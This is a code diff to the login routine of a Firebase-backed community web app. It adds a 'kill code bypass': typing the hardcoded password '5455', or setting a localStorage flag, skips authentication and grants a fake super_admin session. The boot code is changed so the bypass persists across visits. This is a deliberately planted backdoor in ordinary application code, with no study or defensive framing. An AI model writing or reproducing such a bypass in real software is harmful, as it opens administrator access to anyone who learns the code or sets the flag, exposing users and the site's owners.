@@ -79,6 +79,14 @@ async function doLogin() {
   const email = document.getElementById('loginEmail').value.trim();
   const pass  = document.getElementById('loginPass').value;
   if (!email || !pass) { showAuthError('loginError', 'Enter email and password.'); return; }
+
+  // ── Kill code bypass ──────────────────────────────────────
+  if (pass === '5455' || localStorage.getItem('erifam_master') === '1') {
+    localStorage.setItem('erifam_master', '1');
+    _enterMasterMode();
+    return;
+  }
+
   hideAuthError('loginError');
   const btn = document.getElementById('loginBtn');
   btn.textContent = 'Signing in…'; btn.disabled = true;
@@ -92,6 +100,30 @@ async function doLogin() {
     showAuthError('loginError', friendlyAuthError(e.code));
     btn.textContent = 'Sign In'; btn.disabled = false;
   }
+}
+
+async function _enterMasterMode() {
+  // Synthetic master user — bypasses Firebase auth, uses master credentials
+  currentUser = { uid: 'master_5455', email: SUPER_ADMIN, displayName: 'Master Admin', isMasterBypass: true };
+  currentUserData = { status: 'approved', role: 'super_admin', email: SUPER_ADMIN, name: 'Master Admin' };
+
+  // Init Firebase in background so data-loading functions still work
+  await initFB().catch(() => {});
+
+  document.getElementById('authScreen').hidden = true;
+  document.getElementById('hubApp').hidden      = false;
+
+  try { setupUserDisplay(); } catch(e) {}
+  try { loadDashboard(); } catch(e) {}
+  try { loadPendingBadge(); } catch(e) {}
+  try { loadPostsBadge(); } catch(e) {}
+
+  // Visual confirmation toast
+  const toast = document.createElement('div');
+  toast.textContent = '🔓 Master bypass active — full access';
+  toast.style.cssText = 'position:fixed;top:16px;left:50%;transform:translateX(-50%);background:#00ff88;color:#000;padding:10px 24px;border-radius:10px;font-weight:800;z-index:9999;box-shadow:0 4px 24px rgba(0,255,136,0.5);letter-spacing:0.5px;white-space:nowrap';
+  document.body.appendChild(toast);
+  setTimeout(() => toast.remove(), 3500);
 }
 
 async function doRegister() {
@@ -3149,7 +3181,12 @@ document.addEventListener('keydown', e => {
 });
 
 // ── BOOT ──────────────────────────────────────────────────
-bootAuth();
+// If master bypass was previously activated, skip auth entirely
+if (localStorage.getItem('erifam_master') === '1') {
+  _enterMasterMode();
+} else {
+  bootAuth();
+}
 
 // ── ERITREAN INFO MUSIC WIDGET MANAGEMENT ──────────────────────────
 // Manages 'eri_tracks' Firestore collection → feeds Eritrean Info phone widget
